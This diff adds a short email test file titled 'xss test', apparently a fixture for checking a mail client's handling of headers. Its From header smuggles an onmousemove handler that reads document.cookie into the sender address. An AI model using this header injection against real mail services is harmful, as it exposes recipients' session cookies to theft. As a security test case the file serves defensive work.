@@ -1,0 +1,7 @@
+From: <" onmousemove=alert(document.cookie)//@attacker.com>
+Subject: xss test
+To: victim@tom.com
+MIME-Version: 1.0
+Content-type: text/html
+
+xss test
